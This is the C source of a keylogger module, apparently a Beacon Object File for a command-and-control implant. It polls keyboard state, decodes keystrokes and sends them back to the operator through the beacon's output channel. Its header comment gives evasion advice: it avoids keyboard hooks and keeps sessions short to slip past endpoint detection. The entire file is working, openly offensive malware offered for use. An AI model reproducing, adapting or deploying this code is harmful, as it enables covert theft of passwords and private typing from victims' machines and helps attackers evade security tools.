/*
 * keylog.c — in-process keystroke poller (no hooks, no cross-process access).
 *
 * args: int seconds (0 = stop a running capture and flush buffered keys)
 *
 * Worker thread polls GetAsyncKeyState over the full VK range (0x08-0xFE),
 * decodes with ToUnicode against the beacon's own keyboard layout, buffers
 * keystrokes with a tick prefix per idle gap, flushes via BeaconOutput at the
 * window end (lock-safe in-process output).
 *
 * State: statics live in the resident BOF section (sync-slot pool) — a later
 * `keylog 0` reaches a still-running capture from the same beacon. Reload =
 * "no active capture", expected.
 *
 * OPSEC:
 *   - No SetWindowsHookEx / WH_KEYBOARD / journal hooks — GetAsyncKeyState
 *     polling against the beacon's own message queue. Some EDR behavioural
 *     rules watch long GetAsyncKeyState loops — keep sessions short, prefer
 *     clipmon when clipboard content is the goal.
 *   - No other process is touched; one thread in the beacon process.
 *   - Output is text-only (clipboard-style paste from remote shells is
 *     captured through their own clipboard entries via clipmon).
 */
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include "beacon.h"
#include "bofdefs.h"

DECLSPEC_IMPORT SHORT WINAPI USER32$GetAsyncKeyState(int);
DECLSPEC_IMPORT BOOL  WINAPI USER32$GetKeyboardState(BYTE*);
DECLSPEC_IMPORT UINT  WINAPI USER32$MapVirtualKeyExA(UINT, UINT, DWORD);

DECLSPEC_IMPORT HKL   WINAPI USER32$GetKeyboardLayoutA(WORD idThread);
DECLSPEC_IMPORT UINT  WINAPI USER32$MapVirtualKeyA(UINT uCode, UINT uMapType);
DECLSPEC_IMPORT int   WINAPI USER32$ToUnicode(UINT vk, UINT sc, const BYTE* lpKeyState, LPWSTR pwszBuff, int cchBuff, UINT uFlags);

DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetUserDefaultLangID(void);

#define KEY_CAP 8192
#define POLL_MS 12

typedef struct _KEY_STATE {
    HANDLE  thr;
    LONG    running;
    LONG    stopReq;
    DWORD   endTick;
    BYTE    keyState[256];
    char    buf[KEY_CAP];
    int     len;
} KEY_STATE;

static KEY_STATE gKey;

static void KeyAppendChar(const char* s)
{
    int n = (int)MSVCRT$strlen(s);
    if (gKey.len + n + 1 >= KEY_CAP - 32) return;
    MSVCRT$memcpy(gKey.buf + gKey.len, s, n);
    gKey.len += n;
}

static void KeyAppendTick(void)
{
    char t[24];
    MSVCRT$sprintf(t, "[%lu]", (unsigned long)(KERNEL32$GetTickCount() / 1000));
    KeyAppendChar(t);
}

static void FlushKeyBuf(const char* tag)
{
    if (gKey.len) {
        BeaconOutput(CALLBACK_OUTPUT, gKey.buf, gKey.len);
        BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
    } else {
        BeaconOutput(CALLBACK_OUTPUT, "[keylog] no keystrokes captured\n", 32);
    }
    (void)tag;
    gKey.buf[0] = '\0';
    gKey.len = 0;
}

static DWORD WINAPI KeyWorker(LPVOID param)
{
    (void)param;
    DWORD lastGapTick = KERNEL32$GetTickCount();

    while (!gKey.stopReq) {
        if (KERNEL32$GetTickCount() >= gKey.endTick) break;

        if (KERNEL32$GetTickCount() - lastGapTick > 4000 && gKey.len) {
            KeyAppendTick();  /* idle gap marker */
        }
        lastGapTick = KERNEL32$GetTickCount();

        USER32$GetKeyboardState(gKey.keyState);
        HKL hkl = USER32$GetKeyboardLayoutA(0);
        for (UINT vk = 0x08; vk < 0xFF; vk++) {
            SHORT s = USER32$GetAsyncKeyState((int)vk);
            if (!(s & 1)) continue;      /* bit 0: pressed since last call */
            /* decode printable + key names */
            if (vk == VK_RETURN)      { KeyAppendChar("\n"); lastGapTick = 0; continue; }
            if (vk == VK_TAB)         { KeyAppendChar("<tab>"); lastGapTick = 0; continue; }
            if (vk == VK_ESCAPE)      { KeyAppendChar("<esc>"); lastGapTick = 0; continue; }
            if (vk == VK_BACK)        { KeyAppendChar("<bsp>"); lastGapTick = 0; continue; }
            if (vk == VK_SPACE)       { KeyAppendChar(" ");     lastGapTick = 0; continue; }
            UINT sc = USER32$MapVirtualKeyA(vk, MAPVK_VK_TO_VSC);
            wchar_t w[4] = { 0, 0, 0, 0 };
            int n = USER32$ToUnicode(vk, sc, gKey.keyState, w, 3, 0);
            if (n >= 1 && w[0] >= 32 && w[0] < 127) {
                char c = (char)w[0];
                char tmp[2] = { c, 0 };
                KeyAppendChar(tmp);
                lastGapTick = 0;
            } else if (n >= 1) {
                KeyAppendTick();
            }
        }
        KERNEL32$Sleep(POLL_MS);
    }

    char hdr[48];
    MSVCRT$sprintf(hdr, "[keylog] flush (%d bytes)\n", gKey.len);
    BeaconOutput(CALLBACK_OUTPUT, hdr, (int)MSVCRT$strlen(hdr));
    FlushKeyBuf("final");
    gKey.running = 0;
    return 0;
}

void go(char* args, int alen)
{
    datap p;
    BeaconDataParse(&p, args, alen);
    int secs = BeaconDataInt(&p);

    if (secs == 0) {
        if (!gKey.running) {
            BeaconOutput(CALLBACK_OUTPUT, "[keylog] no active capture\n", 27);
            return;
        }
        gKey.stopReq = 1;
        KERNEL32$Sleep(400);
        if (gKey.thr) { KERNEL32$CloseHandle(gKey.thr); gKey.thr = NULL; }
        gKey.running = 0;
        BeaconOutput(CALLBACK_OUTPUT, "[keylog] stopped, flushing\n", 28);
        FlushKeyBuf("stop");
        return;
    }

    MSVCRT$memset(gKey.buf, 0, sizeof(gKey.buf));
    MSVCRT$memset(gKey.keyState, 0, sizeof(gKey.keyState));
    gKey.len = 0;
    gKey.stopReq = 0;
    gKey.endTick = KERNEL32$GetTickCount() + (DWORD)secs * 1000;
    gKey.thr = KERNEL32$CreateThread(NULL, 0, KeyWorker, NULL, 0, NULL);
    if (!gKey.thr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] keylog: CreateThread failed\n");
        return;
    }
    gKey.running = 1;

    char buf[64];
    MSVCRT$sprintf(buf, "[keylog] capture %d s (poll %dms, no hooks)\n", secs, POLL_MS);
    BeaconOutput(CALLBACK_OUTPUT, buf, (int)MSVCRT$strlen(buf));
}